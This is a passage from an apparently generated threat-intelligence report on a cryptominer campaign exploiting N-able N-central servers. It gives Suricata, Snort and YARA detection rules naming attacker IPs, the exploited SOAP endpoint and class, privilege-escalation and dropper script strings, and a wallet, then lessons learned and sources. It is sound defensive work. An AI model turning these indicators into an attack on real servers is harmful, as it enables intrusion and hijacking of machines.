alert tcp $HOME_NET any -> 79.76.51.56 39100 (msg:"Actioner - N-central 4EverAble2Shell Fallback Mining Pool Connection"; flow:established,to_server; classtype:trojan-activity; reference:url,huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers; metadata:author Actioner, created_at 2026-11-14; sid:2200105; rev:1;)
```

### Suricata: N-central 4EverAble2Shell Miner Beacon Callback
Detects HTTP beacon callbacks to the payload server's `/ob/` path.
**Status:** compile: uncompiled (structural check only) | confidence: high
<!-- audit: structural check passed. -->
```suricata
alert http $HOME_NET any -> any any (msg:"Actioner - N-central 4EverAble2Shell Miner Beacon Callback"; flow:established,to_server; http.uri; content:"/ob/"; fast_pattern; content:"157.20.241.16"; http.host; classtype:trojan-activity; reference:url,huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers; metadata:author Actioner, created_at 2026-11-14; sid:2200106; rev:1;)
```

### Snort: N-central 4EverAble2Shell SOAP Fault Exploitation (CVE-2026-90436)
Detects POST requests to the ServerUI endpoint with the TerminalLineSettings payload.
**Status:** compile: uncompiled (structural check only) | confidence: high
<!-- audit: snort not installed; structural check passed -- semicolons terminate all options, http service with http_* sticky buffers, balanced parentheses, msg/sid/rev present. -->
```snort
alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"Actioner - N-central 4EverAble2Shell SOAP Fault Exploitation Attempt (CVE-2026-90436)"; flow:established, to_server; http_method; content:"POST"; http_uri; content:"/dms/services/ServerUI", fast_pattern; http_client_body; content:"jline.internal.TerminalLineSettings"; classtype:web-application-attack; reference:url,huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers; reference:cve,2026-90436; metadata:author Actioner, created 2026-11-14; sid:2100101; rev:1;)
```

### Snort: N-central 4EverAble2Shell python-requests Probe
Detects POST requests to ServerUI with the observed python-requests User-Agent.
**Status:** compile: uncompiled (structural check only) | confidence: high
<!-- audit: structural check passed. -->
```snort
alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"Actioner - N-central 4EverAble2Shell SOAP Fault Probe via python-requests"; flow:established, to_server; http_method; content:"POST"; http_uri; content:"/dms/services/ServerUI"; http_header; content:"python-requests/2.31.0", fast_pattern; classtype:web-application-attack; reference:url,huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers; reference:cve,2026-90436; metadata:author Actioner, created 2026-11-14; sid:2100102; rev:1;)
```

### Snort: N-central 4EverAble2Shell Primary Mining Pool Connection
Detects TCP connections to the primary mining pool.
**Status:** compile: uncompiled (structural check only) | confidence: critical
<!-- audit: structural check passed. -->
```snort
alert tcp $HOME_NET any -> 139.99.69.109 10128 (msg:"Actioner - N-central 4EverAble2Shell Primary Mining Pool Connection"; flow:established, to_server; classtype:trojan-activity; reference:url,huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers; metadata:author Actioner, created 2026-11-14; sid:2100103; rev:1;)
```

### Snort: N-central 4EverAble2Shell Fallback Mining Pool Connection
Detects TCP connections to the fallback mining pool.
**Status:** compile: uncompiled (structural check only) | confidence: critical
<!-- audit: structural check passed. -->
```snort
alert tcp $HOME_NET any -> 79.76.51.56 39100 (msg:"Actioner - N-central 4EverAble2Shell Fallback Mining Pool Connection"; flow:established, to_server; classtype:trojan-activity; reference:url,huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers; metadata:author Actioner, created 2026-11-14; sid:2100104; rev:1;)
```

### YARA: 4EverAble2Shell SOAP Fault Exploit Payload
Detects the SOAP fault exploit payload targeting N-central's Apache Axis endpoint.
**Status:** compile: pass (yarac exit 0) | confidence: high | sample: fired on positive, clean on negative
<!-- audit: yarac exit 0; yara pos_exploit.txt matched (Exploit_NCentral_4EverAble2Shell_SOAPFault); neg.txt no match. Keys on endpoint + class name or SOAP fault structure with known UA. -->
```yara
rule Exploit_NCentral_4EverAble2Shell_SOAPFault
{
    meta:
        description = "Detects 4EverAble2Shell exploit payload targeting N-central Apache Axis SOAP fault processing via jline.internal.TerminalLineSettings class instantiation (CVE-2026-90436)"
        author = "Actioner"
        date = "2026-11-14"
        reference = "https://huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers"
        severity = "critical"

    strings:
        $endpoint = "/dms/services/ServerUI" ascii wide
        $class = "jline.internal.TerminalLineSettings" ascii wide
        $soap_fault = "exceptionName" ascii wide
        $ua = "python-requests/2.31.0" ascii wide

    condition:
        filesize < 5MB and
        $endpoint and
        ($class or ($soap_fault and $ua))
}
```

### YARA: 4EverAble2Shell Privilege Escalation Script
Detects the Python script used for nable-to-root privilege escalation.
**Status:** compile: pass (yarac exit 0) | confidence: high | sample: fired on positive, clean on negative
<!-- audit: yarac exit 0; yara pos_privesc.txt matched; neg.txt no match. String set drawn from Huntback's analysis of the escalation script behavior. Hash: fc4c01fd11bc301cf312830460cfdccc3af9dcfe50c910b86d6a1117bc76c747. -->
```yara
rule Exploit_NCentral_4EverAble2Shell_PrivEsc
{
    meta:
        description = "Detects the 4EverAble2Shell privilege escalation Python script that abuses N-central helper functions to escalate from nable to root"
        author = "Actioner"
        date = "2026-11-14"
        reference = "https://huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers"
        hash = "fc4c01fd11bc301cf312830460cfdccc3af9dcfe50c910b86d6a1117bc76c747"
        severity = "critical"

    strings:
        $s1 = "setLDFileOwner" ascii
        $s2 = "ServerChild.sh" ascii
        $s3 = "serverControl" ascii
        $s4 = "flag_default.json" ascii
        $s5 = "write_before" ascii
        $s6 = "write_after" ascii
        $s7 = "helper_restored" ascii
        $s8 = "nable_wrapper" ascii

    condition:
        filesize < 1MB and
        4 of them
}
```

### YARA: 4EverAble2Shell XMRig Dropper Script (jup.sh)
Detects the jup.sh dropper script used to install the XMRig miner.
**Status:** compile: pass (yarac exit 0) | confidence: high | sample: fired on positive, clean on negative
<!-- audit: yarac exit 0; yara pos_dropper.txt matched; neg.txt no match. Strings drawn from dropper behavior analysis. -->
```yara
rule Trojan_XMRig_4EverAble2Shell_Dropper
{
    meta:
        description = "Detects the jup.sh miner dropper script deployed through 4EverAble2Shell exploitation of N-central servers"
        author = "Actioner"
        date = "2026-11-14"
        reference = "https://huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers"
        severity = "high"

    strings:
        $dir1 = "/tmp/.xvd" ascii
        $dir2 = "/var/tmp/.xvd" ascii
        $pool1 = "139.99.69" ascii
        $pool2 = "79.76.51" ascii
        $rig = "--rig-id nc_" ascii
        $donate = "--donate-level 1" ascii
        $beacon1 = "/ob/cronhit" ascii
        $beacon2 = "/ob/fcheck" ascii
        $keep = "keep.sh" ascii
        $xvd = "xvd.service" ascii

    condition:
        filesize < 500KB and
        3 of them
}
```

### YARA: 4EverAble2Shell XMRig Campaign Configuration
Detects XMRig configuration containing the wallet, pool addresses, or campaign rig-id prefix.
**Status:** compile: pass (yarac exit 0) | confidence: high | sample: fired on positive, clean on negative
<!-- audit: yarac exit 0; yara pos_dropper.txt matched; neg.txt no match. Wallet address is unique to this campaign. -->
```yara
rule Trojan_XMRig_4EverAble2Shell_Config
{
    meta:
        description = "Detects XMRig miner configuration associated with the 4EverAble2Shell campaign targeting N-central servers, including wallet address and pool indicators"
        author = "Actioner"
        date = "2026-11-14"
        reference = "https://huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers"
        severity = "high"

    strings:
        $wallet = "41wx2Pv3FzfRvX11jQgzM4bRbgvr6GViRXCKkHhXhLVQ64mgUR5ks4CEzHx8zqUJ8MgsWwTaWiS3uiZbCgJQnNXoB19mGtr" ascii
        $pool1 = "139.99.69.109:10128" ascii
        $pool2 = "79.76.51.56:39100" ascii
        $rig_prefix = "nc_" ascii

    condition:
        filesize < 10MB and
        ($wallet or (1 of ($pool*) and $rig_prefix))
}
```

## Lessons Learned

This incident demonstrates multiple systemic risks for the MSP ecosystem:

1. **RMM supply chain risk:** A single vulnerability in an RMM platform can cascade to thousands of managed endpoints across hundreds of organizations, making RMM zero-days exceptionally high-impact targets.

2. **Legacy API attack surface:** Despite being disabled by default, the Legacy API's continued presence in N-central's codebase bundles an end-of-life component (Apache Axis 1.x, last updated in 2006) that introduces unauthenticated RCE. This underscores the danger of shipping EOL dependencies even behind feature flags.

3. **Patch bypass speed:** The 4EverAble2Shell PoC was published just two days after N-able's Hotfix 2 and was weaponized within five hours. Organizations must treat patch releases as the start of a window, not the end.

4. **Opportunistic multi-exploit operators:** The attacker's wallet shows 631 rigs across multiple products (Jpom, FreePBX, MLflow, Flink, PaperCut, SFTPGo), indicating a highly automated, multi-exploit operation that weaponizes new PoCs rapidly. Defenders should expect exploitation of any new public PoC within hours.

## Sources

- [BleepingComputer: New N-able 4EverAble2Shell zero-day exploited hours after PoC released](https://www.bleepingcomputer.com/news/security/new-n-able-4everable2shell-zero-day-exploited-hours-after-poc-released/) -- primary reporting on exploitation timeline and scope
- [The Hacker News: Hackers Exploit N-central Flaws to Deploy Crypto Miners](https://thehackernews.com/2026/11/hackers-exploit-n-central-flaws-to.html) -- additional exploitation details and vendor response
- [The Hacker News: New N-central Exploits Work Against Patched Servers](https://thehackernews.com/2026/11/new-n-central-exploits-work-against.html) -- initial 4EverAble2Shell and Agent2Shell disclosure coverage
- [Huntback: N-central 4EverAble2Shell Miners on Live Servers](https://huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers) -- detailed technical analysis with IOCs, miner configuration, and exploitation chain
- [Previdian VULN-2026-0009](https://previdian.com/VULN-2026-0009) -- vulnerability tracking with sensor telemetry
- [Huntress: N-able Disables Cloud Services Following Able2Shell](https://www.huntress.com/blog/n-able-disables-cloud-services-following-disclosure-of-able2shell-exploit-chains) -- comprehensive FAQ with server and endpoint indicators
- [SecurityWeek: Hackers Exploit New N-central Zero-Day Hours After PoC Publication](https://www.securityweek.com/hackers-exploit-new-n-central-zero-day-hours-after-poc-publication/) -- additional reporting
- [Malware.news: 4EverAble2Shell At a Glance](https://malware.news/t/4everable2shell-at-a-glance/127283) -- IOC summary and campaign overview
- [Tenable: Able2Shell FAQ](https://www.tenable.com/blog/able2shell-frequently-asked-questions-for-reported-n-able-n-central-zero-day-vulnerabilities) -- FAQ and timeline for MSPs
- [N-able Status: Hotfix 2 Release Notes](https://status.n-able.com/2026/11/10/n-central-2026-4-hf2-release-notes/) -- vendor hotfix advisory
- [N-able Status: Critical Security Incident](https://uptime.n-able.com/event/202609/) -- vendor incident advisory
- [N-able: How to Upgrade Agents and Probes](https://me.n-able.com/s/article/How-to-upgrade-Agents-and-Probes-on-N-able-N-central-version-2026-4-HF1-and-above) -- vendor upgrade guidance
- [oss-security: CVE-2026-90436](https://openwall.com/lists/oss-security/2026/11/06/12) -- Apache Axis vulnerability disclosure
- [Researcher PoC Repository](https://github.com/MSPNightmare/CVEs) -- public PoC source (0-Days/N-Central N-Able directory)

---
*Report generated by Actioner*
